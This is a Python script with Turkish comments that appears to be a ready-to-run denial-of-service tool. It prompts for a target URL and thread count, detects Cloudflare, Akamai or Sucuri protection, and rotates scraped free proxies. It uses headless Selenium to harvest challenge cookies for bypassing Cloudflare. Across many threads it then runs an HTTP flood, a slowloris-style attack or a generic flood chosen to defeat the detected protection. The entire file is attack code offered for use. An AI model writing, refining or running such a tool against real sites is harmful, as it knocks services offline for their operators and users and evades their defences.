import threading
import requests
import random
import time
from bs4 import BeautifulSoup
from queue import Queue
import logging
import urllib3
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC

# SSL uyarılarını kapat
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Log ayarı
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

# Kullanıcı ajanları
user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_5) AppleWebKit/537.36 (KHTML, like Gecko) Firefox/115.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1"
]

# Proxy kuyruğu
proxies = Queue()

# Script ayarları
target_url = input("Hedef URL (örn: http://localhost): ").strip()
thread_count = int(input("Thread sayısı: "))  # Kullanıcıdan thread sayısı
cookie_queue = Queue()

# WAF tespiti
def detect_waf(url):
    try:
        headers = {"User-Agent": random.choice(user_agents)}
        response = requests.get(url, headers=headers, verify=False, timeout=5)
        server = response.headers.get("Server", "").lower()
        cookies = response.headers.get("Set-Cookie", "").lower()
        content = response.text.lower()

        if "cloudflare" in server or "cf-ray" in response.headers or "cloudflare" in cookies:
            return "Cloudflare"
        if "akamai" in server or "akamai" in response.headers:
            return "Akamai"
        if "sucuri" in server or "sucuri" in content:
            return "Sucuri"
        if any(keyword in content for keyword in ["blocked", "firewall", "403 forbidden"]):
            return "Generic WAF"
        return "None"
    except Exception as e:
        logging.error(f"WAF tespit hatası: {e}")
        return "Error"

# Proxy scraper
def scrape_proxies():
    proxy_sources = [
        "https://free-proxy-list.net/",
        "https://www.sslproxies.org/",
        "https://www.us-proxy.org/"
    ]
    while not proxies.empty():
        proxies.get()
    for source in proxy_sources:
        try:
            headers = {"User-Agent": random.choice(user_agents)}
            response = requests.get(source, headers=headers, verify=False, timeout=10)
            soup = BeautifulSoup(response.text, 'html.parser')
            table = soup.find('table')
            if table:
                rows = table.find_all('tr')[1:]
                for row in rows:
                    cols = row.find_all('td')
                    if len(cols) > 1:
                        ip = cols[0].text.strip()
                        port = cols[1].text.strip()
                        proxy = f"http://{ip}:{port}"
                        proxies.put(proxy)
                logging.info(f"{source} üzerinden {proxies.qsize()} proxy toplandı.")
        except Exception as e:
            logging.error(f"Proxy scrape hatası ({source}): {e}")
    return proxies.qsize() > 0

# Proxy yenile
def refresh_proxies():
    while True:
        if scrape_proxies():
            logging.info(f"Toplam {proxies.qsize()} proxy hazır.")
        else:
            logging.error("Proxy alınamadı, tekrar deneniyor...")
        time.sleep(600)  # 10 dakikada bir yenile

# Selenium ile Cloudflare bypass
def get_selenium_cookies(url):
    try:
        chrome_options = Options()
        chrome_options.add_argument("--headless")
        chrome_options.add_argument(f"user-agent={random.choice(user_agents)}")
        chrome_options.add_argument("--disable-blink-features=AutomationControlled")
        chrome_options.add_argument("--no-sandbox")
        chrome_options.add_argument("--disable-dev-shm-usage")
        driver = webdriver.Chrome(options=chrome_options)
        driver.get(url)
        try:
            WebDriverWait(driver, 10).until(
                EC.presence_of_element_located((By.TAG_NAME, "body"))
            )
            time.sleep(3)  # Challenge çözme süresi
        except:
            pass
        cookies = driver.get_cookies()
        driver.quit()
        logging.info("Selenium ile cookie alındı.")
        return {cookie["name"]: cookie["value"] for cookie in cookies}
    except Exception as e:
        logging.error(f"Selenium hatası: {e}")
        return {}

# Cookie yenile
def refresh_cookies():
    while True:
        cookies = get_selenium_cookies(target_url)
        if cookies:
            cookie_queue.put(cookies)
            logging.info("Yeni cookie sıraya alındı.")
        time.sleep(30)  # 30 saniyede bir yenile

# Proxy test
def test_proxy(proxy):
    try:
        response = requests.get("http://ipinfo.io/json", proxies={"http": proxy, "https": proxy}, verify=False, timeout=5)
        return response.status_code == 200
    except:
        return False

# HTTP flood (Cloudflare için)
def http_flood():
    session = requests.Session()
    while True:
        try:
            proxy = proxies.get() if not proxies.empty() else None
            if proxy and not test_proxy(proxy):
                logging.warning(f"Proxy çalışmıyor: {proxy}")
                continue

            cookies = cookie_queue.get() if not cookie_queue.empty() else get_selenium_cookies(target_url)
            if not cookies:
                logging.error("Cookie alınamadı, devam...")
                time.sleep(5)
                continue

            session.cookies.update(cookies)
            headers = {
                "User-Agent": random.choice(user_agents),
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
                "Accept-Language": "en-US,en;q=0.9",
                "Accept-Encoding": "gzip, deflate, br",
                "Connection": "keep-alive",
                "Upgrade-Insecure-Requests": "1",
                "Sec-Fetch-Dest": "document",
                "Sec-Fetch-Mode": "navigate",
                "Sec-Fetch-Site": "none",
                "Sec-Fetch-User": "?1"
            }
            proxy_dict = {"http": proxy, "https": proxy} if proxy else {}
            response = session.get(target_url, headers=headers, proxies=proxy_dict, verify=False, timeout=5)
            logging.info(f"HTTP Flood isteği: {response.status_code} (Proxy: {proxy or 'Yok'})")
            time.sleep(0.05)
        except Exception as e:
            logging.error(f"HTTP Flood hatası: {e}")
            time.sleep(2)

# Slowloris (Akamai/Sucuri için)
def slowloris():
    session = requests.Session()
    while True:
        try:
            proxy = proxies.get() if not proxies.empty() else None
            if proxy and not test_proxy(proxy):
                logging.warning(f"Proxy çalışmıyor: {proxy}")
                continue

            headers = {
                "User-Agent": random.choice(user_agents),
                "Accept": "text/html",
                "Connection": "keep-alive"
            }
            proxy_dict = {"http": proxy, "https": proxy} if proxy else {}
            session.get(target_url, headers=headers, proxies=proxy_dict, stream=True, verify=False, timeout=5)
            logging.info(f"Slowloris isteği gönderildi (Proxy: {proxy or 'Yok'})")
            time.sleep(1)
        except Exception as e:
            logging.error(f"Slowloris hatası: {e}")
            time.sleep(2)

# Generic flood (WAF yoksa)
def generic_flood():
    session = requests.Session()
    while True:
        try:
            proxy = proxies.get() if not proxies.empty() else None
            if proxy and not test_proxy(proxy):
                logging.warning(f"Proxy çalışmıyor: {proxy}")
                continue

            headers = {
                "User-Agent": random.choice(user_agents),
                "Accept": "*/*",
                "Connection": "close"
            }
            proxy_dict = {"http": proxy, "https": proxy} if proxy else {}
            response = session.get(target_url, headers=headers, proxies=proxy_dict, verify=False, timeout=5)
            logging.info(f"Generic Flood isteği: {response.status_code} (Proxy: {proxy or 'Yok'})")
            time.sleep(0.01)
        except Exception as e:
            logging.error(f"Generic Flood hatası: {e}")
            time.sleep(2)

# Saldırı seç
def select_attack(waf):
    logging.info(f"Tespit edilen WAF: {waf}")
    if waf == "Cloudflare":
        return http_flood
    elif waf in ["Akamai", "Sucuri"]:
        return slowloris
    else:
        return generic_flood

# Ana fonksiyon
def main():
    logging.info(f"Hedef: {target_url}, Thread: {thread_count}")
    waf = detect_waf(target_url)
    attack_func = select_attack(waf)

    # Proxy yenileme
    proxy_thread = threading.Thread(target=refresh_proxies)
    proxy_thread.daemon = True
    proxy_thread.start()

    # Cookie yenileme (Cloudflare için)
    if waf == "Cloudflare":
        cookie_thread = threading.Thread(target=refresh_cookies)
        cookie_thread.daemon = True
        cookie_thread.start()

    # Saldırı thread’leri
    for i in range(thread_count):
        thread = threading.Thread(target=attack_func)
        thread.start()
        logging.info(f"Thread {i+1} başlatıldı ({attack_func.__name__})")

if __name__ == "__main__":
    main()